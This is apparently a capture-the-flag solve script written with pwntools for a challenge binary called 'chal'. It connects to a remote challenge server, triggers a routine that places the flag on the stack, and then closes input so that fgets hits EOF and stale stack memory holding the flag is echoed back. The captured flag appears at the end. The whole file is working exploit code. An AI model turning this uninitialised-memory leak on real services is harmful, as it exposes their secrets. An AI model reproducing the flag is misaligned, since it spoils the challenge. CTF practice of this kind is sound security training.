from pwn import *

context.binary = exe = ELF('./chal', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

# r = process(exe.path)
r = remote("35.187.219.36",33335)

# Step 1: trigger load_flag(), flag is now on stack
r.sendlineafter(b"Enter command: ", b"1")

# Step 2: enter echo()
r.sendlineafter(b"Enter command: ", b"2")

# Step 3: send large size to push buf over old flag
r.sendlineafter(b"Size: ", b"80")

# Step 4: shut down stdin to cause fgets() to hit EOF (no writes!)
r.shutdown('send')

# Step 5: receive all remaining output — it will include the flag
r.interactive()

# flag : IERAE{I/O_15_4n_3s53nt1a1_p1ec3_0f_pwn_f2e8ad23}